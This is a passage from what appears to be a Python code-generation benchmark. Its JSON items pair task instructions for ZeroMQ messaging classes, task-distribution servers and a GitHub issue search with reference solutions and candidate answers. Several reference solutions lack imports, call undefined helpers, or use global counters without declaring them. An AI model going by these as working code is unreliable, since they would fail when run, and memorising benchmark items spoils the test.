    "Canonical_solution": "import os\nimport time\nimport asyncio\nimport platform\nimport string\nimport secrets\nimport numpy as np\nimport logging as log\nfrom threading import Thread\nfrom collections import deque\nfrom os.path import expanduser\nimport zmq\nfrom zmq import auth\nfrom zmq.auth.thread import ThreadAuthenticator\nfrom zmq.error import ZMQError\n\nclass NetGear:\n    def __init__(\n        self,\n        address=None,\n        port=None,\n        protocol=None,\n        pattern=0,\n        receive_mode=False,\n        logging=False,\n        **options\n    ):\n        self.__logging = logging if isinstance(logging, bool) else False\n        self.__msg_context = zmq.Context.instance()\n        self.__receive_mode = receive_mode\n        self.__pattern = pattern\n        self.__terminate = False\n\n        valid_messaging_patterns = {\n            0: (zmq.PAIR, zmq.PAIR),\n            1: (zmq.REQ, zmq.REP),\n            2: (zmq.PUB, zmq.SUB),\n        }\n\n        msg_pattern = valid_messaging_patterns[pattern]\n        self.__msg_socket = self.__msg_context.socket(msg_pattern[1 if receive_mode else 0])\n\n        if pattern == 2:  # PUB/SUB pattern\n            if receive_mode:  # SUB socket\n                self.__msg_socket.setsockopt_string(zmq.SUBSCRIBE, \"\")\n                self.__subscriber_timeout = options.get('subscriber_timeout', None)\n                if self.__subscriber_timeout:\n                    self.__msg_socket.setsockopt(zmq.RCVTIMEO, self.__subscriber_timeout * 1000)\n                    self.__msg_socket.setsockopt(zmq.LINGER, 0)\n            else:  # PUB socket\n                self.__msg_socket.set_hwm(1)\n\n        if receive_mode:\n            address = \"*\" if address is None else address\n            port = \"5555\" if port is None else port\n            self.__msg_socket.bind(f\"{protocol}://{address}:{port}\")\n        else:\n            address = \"localhost\" if address is None else address\n            port = \"5555\" if port is None else port\n            self.__msg_socket.connect(f\"{protocol}://{address}:{port}\")\n\n        if receive_mode and pattern == 2:\n            self.__queue = deque(maxlen=96)\n            self.__thread = Thread(target=self.__recv_handler, name=\"NetGear\")\n            self.__thread.daemon = True\n            self.__thread.start()\n\n    def __recv_handler(self):\n        while not self.__terminate:\n            try:\n                msg_json = self.__msg_socket.recv_json(flags=zmq.NOBLOCK)\n                msg_data = self.__msg_socket.recv(flags=zmq.NOBLOCK)\n                \n                if msg_json[\"terminate_flag\"]:\n                    self.__terminate = True\n                    self.__queue.append(None)\n                    break\n\n                if msg_json[\"compression\"]:\n                    frame = simplejpeg.decode_jpeg(\n                        msg_data,\n                        colorspace=msg_json[\"compression\"][\"colorspace\"],\n                        fastdct=msg_json[\"compression\"][\"dct\"],\n                        fastupsample=msg_json[\"compression\"][\"ups\"],\n                    )\n                else:\n                    frame_buffer = np.frombuffer(msg_data, dtype=msg_json[\"dtype\"])\n                    frame = frame_buffer.reshape(msg_json[\"shape\"])\n\n                self.__queue.append(frame)\n\n            except zmq.ZMQError as e:\n                if e.errno == zmq.EAGAIN:\n                    time.sleep(0.00001)\n                    continue\n                else:\n                    self.__terminate = True\n                    self.__queue.append(None)\n                    break\n\n    def recv(self):\n        if not self.__receive_mode or self.__pattern != 2:\n            raise ValueError(\"recv() can only be used in receive mode with PUB/SUB pattern\")\n\n        while not self.__terminate:\n            if len(self.__queue) > 0:\n                return self.__queue.popleft()\n            time.sleep(0.00001)\n        return None\n\n    def send(self, frame, message=None):\n        if self.__receive_mode or self.__pattern != 2:\n            raise ValueError(\"send() can only be used in send mode with PUB/SUB pattern\")\n\n        exit_flag = True if (frame is None or self.__terminate) else False\n\n        msg_dict = {\n            \"terminate_flag\": exit_flag,\n            \"compression\": False,\n            \"message\": message,\n            \"pattern\": str(self.__pattern),\n            \"dtype\": str(frame.dtype),\n            \"shape\": frame.shape\n        }\n\n        self.__msg_socket.send_json(msg_dict, zmq.SNDMORE)\n        self.__msg_socket.send(frame, copy=False)\n\n    def close(self, kill=False):\n        self.__terminate = True\n        if self.__receive_mode and self.__pattern == 2:\n            if self.__thread is not None:\n                if kill:\n                    self.__msg_context.destroy()\n                self.__thread.join()\n                self.__thread = None\n        self.__msg_socket.close(linger=0)",
    "Code_level": "Class-level",
    "FSMID_for_test": 85,
    "right_result": "import zmq\nimport numpy as np\nfrom collections import deque\nfrom threading import Thread\nimport time\nimport zlib\n\nclass NetGear:\n    def __init__(self, address=None, port=None, protocol=None, pattern=2, receive_mode=False, logging=False, compress=False, comp_level=3, timeout=5, **options):\n        self.__logging = logging\n        self.__msg_context = zmq.Context()\n        self.__receive_mode = receive_mode\n        self.__pattern = pattern\n        self.__terminate = False\n        self.__subscriber_timeout = timeout\n        self.__compress = compress\n        self.__comp_level = comp_level\n        self.__queue = deque()\n        self.__thread = None\n        self.__msg_socket = None\n\n        if protocol is None:\n            protocol = 'tcp'\n\n        if address is None:\n            address = '*'\n        \n        if port is None:\n            port = 5555\n\n        endpoint = f\"{protocol}://{address}:{port}\"\n\n        if pattern == 0:  # PAIR\n            if receive_mode:\n                self.__msg_socket = self.__msg_context.socket(zmq.PAIR)\n                self.__msg_socket.bind(endpoint)\n            else:\n                self.__msg_socket = self.__msg_context.socket(zmq.PAIR)\n                self.__msg_socket.connect(endpoint)\n        elif pattern == 1:  # REQ/REP\n            if receive_mode:\n                self.__msg_socket = self.__msg_context.socket(zmq.REP)\n                self.__msg_socket.bind(endpoint)\n            else:\n                self.__msg_socket = self.__msg_context.socket(zmq.REQ)\n                self.__msg_socket.connect(endpoint)\n        elif pattern == 2:  # PUB/SUB\n            if receive_mode:\n                self.__msg_socket = self.__msg_context.socket(zmq.SUB)\n                self.__msg_socket.setsockopt_string(zmq.SUBSCRIBE, '')\n                self.__msg_socket.setsockopt(zmq.RCVTIMEO, self.__subscriber_timeout * 1000)\n                self.__msg_socket.connect(endpoint)\n                self.__thread = Thread(target=self.__recv_handler)\n                self.__thread.daemon = True\n                self.__thread.start()\n            else:\n                self.__msg_socket = self.__msg_context.socket(zmq.PUB)\n                self.__msg_socket.bind(endpoint)\n\n    def __recv_handler(self):\n        while not self.__terminate:\n            try:\n                message = self.__msg_socket.recv(flags=zmq.NOBLOCK)\n                if message:\n                    if self.__compress:\n                        try:\n                            message = zlib.decompress(message)\n                        except Exception as e:\n                            if self.__logging:\n                                print(f\"Decompression error: {e}\")\n                            continue\n                    frame = np.frombuffer(message, dtype=np.uint8)\n                    self.__queue.append(frame)\n            except zmq.Again:\n                time.sleep(0.01)\n            except Exception as e:\n                if self.__logging:\n                    print(f\"Receive error: {e}\")\n                break\n\n    def recv(self):\n        if not self.__receive_mode or self.__pattern != 2:\n            return None\n        if len(self.__queue) > 0:\n            return self.__queue.popleft()\n        return None\n\n    def send(self, frame, message=None):\n        if self.__receive_mode or self.__pattern != 2:\n            return\n\n        if not isinstance(frame, bytes):\n            if isinstance(frame, np.ndarray):\n                frame = frame.tobytes()\n            else:\n                raise TypeError(\"Frame must be a numpy array or bytes\")\n\n        if self.__compress:\n            frame = zlib.compress(frame, level=self.__comp_level)\n\n        if message is not None:\n            if isinstance(message, str):\n                message = message.encode('utf-8')\n            elif isinstance(message, dict):\n                import json\n                message = json.dumps(message).encode('utf-8')\n            frame = message + b'\\x00' + frame\n\n        self.__msg_socket.send(frame)\n\n    def close(self, kill=False):\n        self.__terminate = True\n        if self.__thread:\n            self.__thread.join(timeout=1 if not kill else 0)\n        if self.__msg_socket:\n            self.__msg_socket.close()\n        if self.__msg_context:\n            self.__msg_context.term()"
  },
  {
    "Task_id": 478,
    "Instruction": "Task Description: Implement a ZeroMQ-based consumer class in Python that subscribes to messages from a publisher, processes token information from shared memory requests, and manages resource recycling.\n\nClass Description: The ZeroMQConsumer class is responsible for receiving and processing messages from a detokenization service via ZeroMQ's PUB/SUB pattern. It manages shared memory requests, tracks request statuses, and handles resource recycling when requests are completed.\n\nAttributes:\n- context: zmq.asyncio.Context - ZeroMQ asynchronous context for managing sockets\n- recv_from_detokenization: zmq.SUB - SUB socket for receiving messages from the publisher\n- shm_req_manager: ShmReqManager - Manager for shared memory request objects\n- req_id_to_out_inf: Dict[int, ReqStatus] - Dictionary mapping request IDs to their status objects\n- recycle_event: asyncio.Event - Event flag for triggering resource recycling\n\nMethods:\n- __init__(zmq_mode: str, detokenization_pub_port: int, shm_req_manager: ShmReqManager) -> None - Initializes the consumer with ZeroMQ configuration and shared memory manager\n- handle_loop() -> None - Main processing loop that receives messages and manages token output\n- recycle_resource_loop() -> None - Background loop for recycling completed request resources\n\nHelper Class (ReqStatus):\n- __init__(group_request_id, multimodal_params, req_objs: List[Req], start_time) -> None - Tracks status of a request group\n- can_release() -> bool - Determines if all requests in the group can be released",
    "Canonical_solution": "import zmq\nimport zmq.asyncio\nfrom typing import Dict\nfrom lightllm.server.core.objs import Req\nfrom lightllm.server.core.objs.shm_req_manager import ShmReqManager\nfrom lightllm.server.core.objs.io_objs import GroupReqObjs\nimport asyncio\n\nclass ZeroMQConsumer:\n    def __init__(self, zmq_mode: str, detokenization_pub_port: int, shm_req_manager: ShmReqManager):\n        self.context = zmq.asyncio.Context()\n        self.recv_from_detokenization = self.context.socket(zmq.SUB)\n        self.recv_from_detokenization.connect(f\"{zmq_mode}127.0.0.1:{detokenization_pub_port}\")\n        self.recv_from_detokenization.setsockopt(zmq.SUBSCRIBE, b\"\")\n        self.shm_req_manager = shm_req_manager\n        self.req_id_to_out_inf: Dict[int, ReqStatus] = {}\n        self.recycle_event = asyncio.Event()\n\n    async def handle_loop(self):\n        asyncio.create_task(self.recycle_resource_loop())\n        \n        while True:\n            try:\n                await asyncio.wait_for(self.recv_from_detokenization.recv_pyobj(), timeout=0.05)\n            except asyncio.TimeoutError:\n                pass\n\n            for req_status in self.req_id_to_out_inf.values():\n                token_list = []\n                for req in req_status.group_req_objs.shm_req_objs:\n                    req_id = req.request_id\n                    if not req.out_tokens_queue.is_empty():\n                        text, src_index, special, count_output_tokens = req.out_tokens_queue.peek()\n                        metadata = {\n                            \"id\": int(req.shm_prompt_ids.arr[src_index]),\n                            \"logprob\": float(req.shm_logprobs.arr[src_index]),\n                            \"special\": special,\n                            \"count_output_tokens\": count_output_tokens,\n                            \"prompt_cache_len\": req.prompt_cache_len,\n                        }\n                        req.out_tokens_queue.pop_no_ret()\n\n                        if req.finish_token_index != src_index:\n                            token_list.append((req_id, text, metadata, FinishStatus()))\n                        else:\n                            finish_status = FinishStatus(req.finish_status.status)\n                            token_list.append((req_id, text, metadata, finish_status))\n\n                async with req_status.lock:\n                    req_status.out_token_info_list.extend(token_list)\n                    req_status.event.set()\n\n            self.recycle_event.set()\n\n    async def recycle_resource_loop(self):\n        while True:\n            try:\n                await asyncio.wait_for(self.recycle_event.wait(), timeout=0.02)\n            except asyncio.TimeoutError:\n                pass\n            self.recycle_event.clear()\n\n            release_req_status = []\n            for req_status in self.req_id_to_out_inf.values():\n                if req_status.can_release():\n                    release_req_status.append(req_status)\n\n            for req_status in release_req_status:\n                self.req_id_to_out_inf.pop(req_status.group_req_objs.group_req_id, None)\n                for req in req_status.group_req_objs.shm_req_objs:\n                    await self.shm_req_manager.async_put_back_req_obj(req)\n                    await self.shm_req_manager.async_release_req_index(req.index_in_shm_mem)\n\nclass ReqStatus:\n    def __init__(self, group_request_id, multimodal_params, req_objs: List[Req], start_time) -> None:\n        self.lock = asyncio.Lock()\n        self.event = asyncio.Event()\n        self.group_req_objs = GroupReqObjs(\n            group_req_id=group_request_id,\n            multimodal_params=multimodal_params,\n            shm_req_objs=req_objs,\n            time_mark=start_time,\n        )\n        self.out_token_info_list = []\n\n    def can_release(self):\n        for req in self.group_req_objs.shm_req_objs:\n            if not req.can_release():\n                return False\n        return True",
    "Code_level": "Class-level",
    "FSMID_for_test": 85,
    "right_result": "import zmq\nimport zmq.asyncio\nfrom typing import Dict, List\nfrom asyncio import Event\n\nclass Req:\n    pass\n\nclass MultimodalParams:\n    pass\n\nclass ReqStatus:\n    def __init__(self, group_request_id, multimodal_params, req_objs: List[Req], start_time):\n        self.group_request_id = group_request_id\n        self.multimodal_params = multimodal_params\n        self.req_objs = req_objs\n        self.start_time = start_time\n\n    def can_release(self) -> bool:\n        return all(hasattr(req, 'released') for req in self.req_objs)\n\nclass ShmReqManager:\n    def get_req_status(self, group_request_id: int) -> ReqStatus:\n        pass\n\n    def add_request(self, group_request_id: int, req: Req):\n        pass\n\nclass ZeroMQConsumer:\n    def __init__(self, zmq_mode: str, detokenization_pub_port: int, shm_req_manager: ShmReqManager) -> None:\n        self.context = zmq.asyncio.Context()\n        self.recv_from_detokenization = self.context.socket(zmq.SUB)\n        if zmq_mode == \"PUB\":\n            self.recv_from_detokenization.bind(f\"tcp://*:{detokenization_pub_port}\")\n        elif zmq_mode == \"SUB\":\n            self.recv_from_detokenization.connect(f\"tcp://localhost:{detokenization_pub_port}\")\n        self.recv_from_detokenization.setsockopt(zmq.SUBSCRIBE, b'')\n        self.shm_req_manager = shm_req_manager\n        self.req_id_to_out_inf: Dict[int, ReqStatus] = {}\n        self.recycle_event = Event()\n\n    async def handle_loop(self) -> None:\n        while True:\n            message = await self.recv_from_detokenization.recv_pyobj()\n            group_request_id = message.get('group_request_id')\n            token_info = message.get('token_info')\n\n            if group_request_id not in self.req_id_to_out_inf:\n                multimodal_params = MultimodalParams()\n                req_status = ReqStatus(group_request_id, multimodal_params, [], 0.0)\n                self.req_id_to_out_inf[group_request_id] = req_status\n\n            req = Req()\n            self.req_id_to_out_inf[group_request_id].req_objs.append(req)\n            self.shm_req_manager.add_request(group_request_id, req)\n\n            if self.req_id_to_out_inf[group_request_id].can_release():\n                self.recycle_event.set()\n\n    async def recycle_resource_loop(self) -> None:\n        while True:\n            await self.recycle_event.wait()\n            for req_id, req_status in list(self.req_id_to_out_inf.items()):\n                if req_status.can_release():\n                    del self.req_id_to_out_inf[req_id]"
  },
  {
    "Task_id": 479,
    "Instruction": "Task Description: Implement a ZeroMQ-based server that handles task distribution and status updates from multiple workers using the REQ/REP pattern. The server should manage a queue of tasks, distribute them to workers, and handle task success/failure notifications.\n\nFunction Description: The `server` function sets up a ZeroMQ REP socket to listen for worker requests. It manages a task queue (`remaining_entries`) and worker count (`running_workers`), distributing tasks to workers and processing their success/failure responses. The server runs indefinitely until all tasks are completed or workers disconnect.\n\nInput:\n- `--channel-ip` (str, optional): IP address for ZeroMQ communication (default: None, binds to all interfaces)\n- `--channel-port` (int, optional): Port number for ZeroMQ communication (default: 5555)\n\nOutput: None (runs indefinitely as a server process)\n\nNote: The function maintains internal state for:\n1. `remaining_entries`: List of pending task IDs\n2. `running_workers`: Count of active workers\nThese should be initialized before the main loop (not shown in reference code)",
    "Canonical_solution": "import zmq\nimport time\nimport argparse\n\ndef server():\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\n        \"--channel-ip\",\n        type=str,\n        default=None,\n        help=\"IP for ZeroMQ channel\",\n    )\n    parser.add_argument(\n        \"--channel-port\",\n        type=int,\n        default=5555,\n        help=\"Port for ZeroMQ channel\",\n    )\n    args = parser.parse_known_args()[0]\n\n    context = zmq.Context()\n    socket = context.socket(zmq.REP)\n    socket.bind(f\"tcp://*:{args.channel_port}\")\n\n    while True:\n        msg = socket.recv_json()\n        rank = msg[\"rank\"]\n        action = msg[\"action\"]\n\n        if action == \"pull\":\n            if len(remaining_entries) == 0:\n                socket.send_json({\"task_id\": None})\n                running_workers -= 1\n                if running_workers == 0:\n                    break\n            else:\n                entry = remaining_entries.pop()\n                socket.send_json({\"task_id\": entry})\n        else:\n            if action == \"success\":\n                socket.send_json({\"pong\": 1})\n            else:\n                remaining_entries.append(msg['task_id'])\n                socket.send_json({\"pong\": 1})\n                break",
    "Code_level": "Function-level",
    "FSMID_for_test": 87,
    "right_result": "import zmq\nimport argparse\n\ndef server(channel_ip=None, channel_port=5555):\n    context = zmq.Context()\n    socket = context.socket(zmq.REP)\n    bind_address = f\"tcp://{channel_ip if channel_ip else '*'}:{channel_port}\"\n    socket.bind(bind_address)\n\n    remaining_entries = list(range(100))  # Example task IDs 0-99\n    running_workers = 0\n\n    try:\n        while True:\n            message = socket.recv_json()\n            if not message:\n                continue\n\n            if message.get(\"type\") == \"connect\":\n                running_workers += 1\n                socket.send_json({\"status\": \"connected\", \"worker_count\": running_workers})\n            \n            elif message.get(\"type\") == \"request_task\":\n                if remaining_entries:\n                    task_id = remaining_entries.pop(0)\n                    socket.send_json({\"task_id\": task_id})\n                else:\n                    socket.send_json({\"status\": \"no_tasks\"})\n            \n            elif message.get(\"type\") == \"task_complete\":\n                status = message.get(\"status\")\n                task_id = message.get(\"task_id\")\n                if status == \"success\":\n                    pass\n                elif status == \"failed\":\n                    remaining_entries.append(task_id)\n                socket.send_json({\"status\": \"ack\"})\n            \n            elif message.get(\"type\") == \"disconnect\":\n                running_workers -= 1\n                socket.send_json({\"status\": \"disconnected\"})\n            \n            if not remaining_entries and not running_workers:\n                break\n    except KeyboardInterrupt:\n        pass\n    finally:\n        socket.close()\n        context.term()"
  },
  {
    "Task_id": 48,
    "Instruction": "Task Description: Implement an asynchronous function to search GitHub issues using the GitHub API, handling authentication and response processing.\n\nFunction Description: The function `search_github_issues` asynchronously searches for GitHub issues based on a query string, with options to specify the repository, number of results, and an optional API token. It handles authentication, sends an HTTP GET request to the GitHub API, processes the response, and returns a formatted summary of the issues found.\n\nInput:\n- `query`: str - The search query string for GitHub issues.\n- `repo`: str (optional, default=\"prefecthq/prefect\") - The repository to search in, formatted as \"owner/repo\".\n- `n`: int (optional, default=3) - The maximum number of issues to return.\n- `api_token`: Optional[str] (optional, default=None) - The GitHub API token for authentication. If not provided, the function attempts to retrieve it from various sources.\n\nOutput:\n- str - A formatted string summarizing the found GitHub issues, including their titles, URLs, and truncated bodies. Returns \"No issues found.\" if no issues match the query.",
    "Canonical_solution": "import os\nimport httpx\nfrom typing import Optional\n\nasync def get_token() -> str:\n    try:\n        from prefect.blocks.system import Secret\n        return (await Secret.load(name=\"github-token\")).get()  # type: ignore\n    except (ImportError, ValueError) as exc:\n        getattr(get_logger(\"marvin\"), \"debug_kv\")(\n            (\n                \"Prefect Secret for GitHub token not retrieved. \"\n                f\"{exc.__class__.__name__}: {exc}\"\n                \"red\"\n            ),\n        )\n\n    try:\n        return getattr(marvin.settings, \"github_token\")\n    except AttributeError:\n        pass\n\n    if token := os.environ.get(\"MARVIN_GITHUB_TOKEN\", \"\"):\n        return token\n\n    raise RuntimeError(\"GitHub token not found\")\n\nasync def search_github_issues(\n    query: str,\n    repo: str = \"prefecthq/prefect\",\n    n: int = 3,\n    api_token: Optional[str] = None,\n) -> str:\n    headers = {\"Accept\": \"application/vnd.github.v3+json\"}\n    headers[\"Authorization\"] = f\"Bearer {api_token or await get_token()}\"\n\n    async with httpx.AsyncClient() as client:\n        response = await client.get(\n            \"https://api.github.com/search/issues\",\n            headers=headers,\n            params={\n                \"q\": query if \"repo:\" in query else f\"repo:{repo} {query}\",\n                \"order\": \"desc\",\n                \"per_page\": n,\n            },\n        )\n        response.raise_for_status()\n\n    issues_data = response.json()[\"items\"]\n\n    for issue in issues_data:\n        if not issue[\"body\"]:\n            continue\n        issue[\"body\"] = slice_tokens(issue[\"body\"], 1000)\n\n    issues = [GitHubIssue(**issue) for issue in issues_data]\n\n    summary = \"\\n\\n\".join(\n        f\"{issue.title} ({issue.html_url}):\\n{issue.body}\" for issue in issues\n    )\n    if not summary.strip():\n        return \"No issues found.\"\n    return summary",
    "Code_level": "Function-level",
    "FSMID_for_test": 59,
    "right_result": "import os\nimport httpx\nfrom typing import Optional\n\nasync def search_github_issues(query: str, repo: str = \"prefecthq/prefect\", n: int = 3, api_token: Optional[str] = None) -> str:\n    if not api_token:\n        api_token = os.getenv(\"GITHUB_API_TOKEN\")\n    headers = {\"Authorization\": f\"Bearer {api_token}\"} if api_token else {}\n    async with httpx.AsyncClient() as client:\n        response = await client.get(f\"https://api.github.com/search/issues?q={query}+repo:{repo}&per_page={n}\", headers=headers)\n    if response.status_code != 200:\n        return f\"Error: Received status code {response.status_code}\"\n    data = response.json()\n    issues = data.get(\"items\", [])\n    if not issues:\n        return \"No issues found.\"\n    result = []\n    for issue in issues[:n]:\n        body = issue[\"body\"][:100] + \"...\" if len(issue[\"body\"]) > 100 else issue[\"body\"]\n        result.append(f\"Title: {issue['title']}\\nURL: {issue['html_url']}\\nBody: {body}\\n{'-'*40}\")\n    return \"\\n\".join(result)"
  },
  {
    "Task_id": 480,
    "Instruction": "Task Description: Implement a ZeroMQ-based server that handles task distribution and status updates between multiple workers using the REQ/REP pattern.\n\nFunction Description: The server function establishes a ZeroMQ REP socket to listen for worker requests. It manages a pool of tasks (remaining_entries) and distributes them to workers. Workers can request tasks (\"pull\") or report task completion status (\"success\"/\"failure\"). The server responds accordingly and tracks active workers. The loop continues until all tasks are completed and all workers have finished.\n\nInput:\n- --channel-ip (str, optional): IP address for ZeroMQ channel (default: None)\n- --channel-port (int): Port number for ZeroMQ channel (default: 5555)\n\nOutput: None (The function runs indefinitely until all tasks are completed and all workers have disconnected)\n\nNote: The function uses two global variables:\n- remaining_entries: List of pending task IDs\n- running_workers: Count of currently active workers\n\nThe server expects and sends JSON messages with the following formats:\nReceived messages:\n- {\"rank\": [worker_id], \"action\": \"pull\"}\n- {\"rank\": [worker_id], \"action\": \"success\"/\"failure\", \"task_id\": [task_id]}\n\nSent responses:\n- {\"task_id\": [task_id]} (for pull requests)\n- {\"task_id\": None} (when no tasks remain)\n- {\"pong\": 1} (acknowledgment for status updates)\n\nThe server maintains task state by:\n1. Removing tasks when assigned\n2. Re-adding tasks if workers report failure\n3. Tracking active workers until all complete their tasks",
    "Canonical_solution": "import zmq\nimport time\nimport torch\n\ndef server():\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\n        \"--channel-ip\",\n        type=str,\n        default=None,\n        help=\"IP for ZeroMQ channel\",\n    )\n    parser.add_argument(\n        \"--channel-port\",\n        type=int,\n        default=5555,\n        help=\"Port for ZeroMQ channel\",\n    )\n    args = parser.parse_known_args()[0]\n\n    context = zmq.Context()\n    socket = context.socket(zmq.REP)\n    socket.bind(f\"tcp://*:{args.channel_port}\")\n\n    while True:\n        msg = socket.recv_json()\n        rank = msg[\"rank\"]\n        action = msg[\"action\"]\n\n        if action == \"pull\":\n            if len(remaining_entries) == 0:\n                socket.send_json({\"task_id\": None})\n                running_workers -= 1\n                if running_workers == 0:\n                    break\n            else:\n                entry = remaining_entries.pop()\n                socket.send_json({\"task_id\": entry})\n        else:\n            if action == \"success\":\n                socket.send_json({\"pong\": 1})\n            else:\n                remaining_entries.append(msg['task_id'])\n                socket.send_json({\"pong\": 1})\n                break",
    "Code_level": "Function-level",
    "FSMID_for_test": 87,
    "right_result": "import zmq\nimport json\nimport argparse\nfrom threading import Thread\n\nremaining_entries = []\nrunning_workers = 0\n\ndef start_server(channel_ip=None, channel_port=5555):\n    global remaining_entries, running_workers\n    \n    context = zmq.Context()\n    socket = context.socket(zmq.REP)\n    \n    bind_address = f\"tcp://*:{channel_port}\" if channel_ip is None else f\"tcp://{channel_ip}:{channel_port}\"\n    socket.bind(bind_address)\n\n    print(f\"Server started on {bind_address}\")\n\n    try:\n        while True:\n            message = socket.recv_string()\n            msg_dict = json.loads(message)\n            \n            worker_rank = msg_dict.get(\"rank\")\n            action = msg_dict.get(\"action\")\n\n            if action == \"pull\":\n                running_workers += 1\n                if remaining_entries:\n                    task_id = remaining_entries.pop(0)\n                    response = json.dumps({\"task_id\": task_id})\n                else:\n                    response = json.dumps({\"task_id\": None})\n            \n            elif action in [\"success\", \"failure\"]:\n                task_id = msg_dict.get(\"task_id\")\n                if action == \"failure\" and task_id not in remaining_entries:\n                    remaining_entries.append(task_id)\n                \n                running_workers -= 1\n                response = json.dumps({\"pong\": 1})\n            \n            else:\n                response = json.dumps({\"error\": \"Invalid action\"})\n            \n            socket.send_string(response)\n\n            if not remaining_entries and running_workers == 0:\n                break\n\n    except Exception as e:\n        print(f\"Error: {e}\")\n    finally:\n        socket.close()\n        context.term()\n\nif __name__ == \"__main__\":\n    parser = argparse.ArgumentParser(description=\"Start ZeroMQ server for task distribution.\")\n    parser.add_argument(\"--channel-ip\", type=str, help=\"IP address for the ZeroMQ channel\", default=None)\n    parser.add_argument(\"--channel-port\", type=int, help=\"Port number for the ZeroMQ channel\", default=5555)\n    args = parser.parse_args()\n\n    start_server(args.channel_ip, args.channel_port)"
  },
  {
    "Task_id": 482,
    "Instruction": "Task Description: Create a ZeroMQ Publisher (PUB) handler class that can send metrics over a TCP connection using the PUB/SUB pattern.\n\nClass Description: The `zmqHandler` class is a ZeroMQ-based publisher that inherits from a base `Handler` class. It establishes a PUB socket to publish metrics to subscribers. The class handles socket creation, binding, and message sending.\n\nAttributes:\n- context: [zmq.Context] - ZeroMQ context for managing sockets\n- socket: [zmq.Socket] - PUB socket for sending messages\n- port: [int] - Port number to bind the socket to\n- enabled: [bool] - Flag indicating if the handler is operational (inherited)\n- config: [dict] - Configuration dictionary (inherited)\n- log: [Logger] - Logger instance (inherited)\n\nMethods:\n- __init__(config: dict) -> None - Constructor that initializes the handler with configuration\n  Input: config - Dictionary containing configuration parameters\n  Output: None\n\n- _bind() -> None - Internal method to create and bind the PUB socket\n  Input: None\n  Output: None\n\n- process(metric: Any) -> None - Publishes a metric through the PUB socket\n  Input: metric - The data to be published (converted to string)\n  Output: None",
    "Canonical_solution": "import zmq\nfrom Handler import Handler\n\nclass zmqHandler(Handler):\n    def __init__(self, config=None):\n        Handler.__init__(self, config)\n        \n        if not zmq:\n            self.log.error('zmq import failed. Handler disabled')\n            self.enabled = False\n            return\n\n        self.context = None\n        self.socket = None\n        self.port = int(self.config['port'])\n        self._bind()\n\n    def _bind(self):\n        if not zmq:\n            return\n        self.context = zmq.Context()\n        self.socket = self.context.socket(zmq.PUB)\n        self.socket.bind(\"tcp://*:%i\" % self.port)\n\n    def process(self, metric):\n        if not zmq:\n            return\n        self.socket.send(\"%s\" % str(metric))",
    "Code_level": "Class-level",
    "FSMID_for_test": 88,
    "right_result": "import zmq\n\nclass Handler:\n    def __init__(self, config):\n        self.config = config\n        self.enabled = True\n        self.log = None\n\nclass zmqHandler(Handler):\n    def __init__(self, config):\n        super().__init__(config)\n        self.context = zmq.Context()\n        self.socket = None\n        self.port = config.get('port', 5556)\n        self._bind()\n\n    def _bind(self):\n        self.socket = self.context.socket(zmq.PUB)\n        self.socket.bind(f\"tcp://*:{self.port}\")\n\n    def process(self, metric):\n        if self.socket:\n            self.socket.send_string(str(metric))"
  },
  {
    "Task_id": 483,
    "Instruction": "Task Description: Implement a distributed task processing system using ZeroMQ's REQ/REP pattern where a client requests tasks from a server, processes them, and reports back the results or failures.\n\nFunction Description: The function `run_generation_distributed` establishes a ZeroMQ REQ socket connection to a server, continuously requests tasks, processes them, and writes the results to a file. It handles task distribution, processing, and status reporting (success/failure) back to the server.\n\nInput:\n- `args`: [object] - Configuration object containing:\n  - `channel_ip`: [str] - IP address of the ZeroMQ server\n  - `channel_port`: [int] - Port of the ZeroMQ server\n  - `output_path`: [str] - Directory path for output files\n  - `task_name`: [str] - Base name for output files\n  - `temperature`: [float] - Processing parameter\n  - `top_p`: [float] - Processing parameter\n  - `samples_per_problem`: [int] - Number of samples per task\n  - `rank`: [int] - Worker identifier\n- `model`: [object] - Model used for processing tasks (not directly used in shown code)\n- `tokenizer`: [object] - Tokenizer used for processing tasks (not directly used in shown code)\n\nOutput:\n- None (direct output) - Results are written to a JSONL file in the specified output directory\n- Side Effects:\n  - Creates output directory if it doesn't exist\n  - Writes processed results to a JSONL file\n  - Communicates task status (success/failure) back to server",
    "Canonical_solution": "import zmq\n\ndef run_generation_distributed(args, model, tokenizer):\n    logger.info(f\"Connecting to tcp://{args.channel_ip}:{args.channel_port}\")\n    context = zmq.Context()\n    socket = context.socket(zmq.REQ)\n    socket.connect(f\"tcp://{args.channel_ip}:{args.channel_port}\")\n    \n    os.makedirs(args.output_path, exist_ok=True)\n    output_path = os.path.join(\n        args.output_path,\n        f\"{args.task_name}-t{args.temperature}-topp{args.top_p}-ns{args.samples_per_problem}-rank{args.rank}.jsonl\",\n    )\n    \n    fout = open(output_path, \"w\", encoding=\"utf-8\")\n    while True:\n        socket.send_json({\"rank\": args.rank, \"action\": \"pull\"})\n        resp = socket.recv_json()\n        try:\n            if resp[\"task_id\"] is None:\n                break\n\n            current_spec = resp[\"task_id\"]\n            results = process(current_spec)\n            \n            for res in results:\n                fout.write(json.dumps(res, ensure_ascii=False) + \"\\n\")\n                fout.flush()\n\n            socket.send_json(\n                {\n                    \"rank\"   : args.rank,\n                    \"action\" : \"success\",\n                    \"task_id\": current_spec['task_id']\n                }\n            )\n            socket.recv()\n\n        except Exception as e:\n            logger.error(f\"*** (rank={args.rank}) crashed.\")\n            logger.error(f\"    error: {repr(e)}\")\n            socket.send_json(\n                {\n                    \"rank\"   : args.rank,\n                    \"action\" : \"fail\",\n                    \"task_id\": current_spec['task_id']\n                }\n            )\n            socket.recv()\n            continue",
    "Code_level": "Function-level",
    "FSMID_for_test": 86,
